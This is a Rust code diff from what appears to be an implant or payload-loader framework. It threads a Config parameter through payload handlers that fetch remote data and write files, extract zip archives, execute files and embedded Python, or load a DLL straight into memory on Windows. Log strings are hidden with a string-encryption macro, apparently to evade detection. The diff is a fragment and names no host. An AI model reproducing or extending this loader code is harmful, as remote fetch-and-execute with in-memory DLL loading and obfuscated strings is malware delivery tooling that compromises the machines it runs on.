@@ -23,6 +23,7 @@ use std::io::stdout;
 use std::io::Write;
 
 use crate::link::{Link, LinkFetch};
+use crate::config::Config;
 
 use cryptify::encrypt_string;
 
@@ -54,14 +55,14 @@ pub enum Payload {
     Exec(Exec),
 }
 impl Payload {
-    pub fn exec_payload(&self) -> PayloadExec {
+    pub fn exec_payload(&self,config:&Config) -> PayloadExec {
         let exec_result = match &self {
             Payload::Banner() => banner(),
-            Payload::WriteFile(payload) => payload.write_file(),
-            Payload::WriteZip(payload) => payload.write_zip(),
+            Payload::WriteFile(payload) => payload.write_file(config),
+            Payload::WriteZip(payload) => payload.write_zip(config),
             Payload::Exec(payload) => payload.exec_file(),
             Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
-            Payload::DllFromMemory(payload) => payload.dll_from_memory(),
+            Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
         };
         match exec_result {
             Ok(a) => a,
@@ -109,14 +110,14 @@ pub struct DllFromMemory {
 
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
-    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn dll_from_memory(&self,_config:&Config) -> Result<PayloadExec, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
         Ok(PayloadExec::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
-        let data: Vec<u8> = self.link.fetch_data()?;
+    pub fn dll_from_memory(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
+        let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
             let thread_dll_entrypoint = self.dll_entrypoint.clone();
@@ -248,12 +249,12 @@ pub struct WriteZip {
 }
 
 impl WriteZip {
-    pub fn write_zip(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_zip(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
         //TODO found a way, not to recreate everything every time this payload run
         let path: PathBuf = calculate_path(&self.path)?;
         let _ = create_diretory(&path)?;
 
-        let archive: Vec<u8> = self.link.fetch_data()?;
+        let archive: Vec<u8> = self.link.fetch_data(config)?;
 
         info!("{}{:?}", encrypt_string!("[+] Write zip: "), path);
         match zip_extract::extract(Cursor::new(archive), &path, true) {
@@ -280,13 +281,13 @@ pub struct WriteFile {
 }
 
 impl WriteFile {
-    pub fn write_file(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_file(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
         if same_hash_sha512(&self.hash, &path) == false {
             let _ = create_diretory(&path)?;
 
-            let body: Vec<u8> = self.link.fetch_data()?;
+            let body: Vec<u8> = self.link.fetch_data(config)?;
 
             info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
             let mut f = File::create(&path)?;
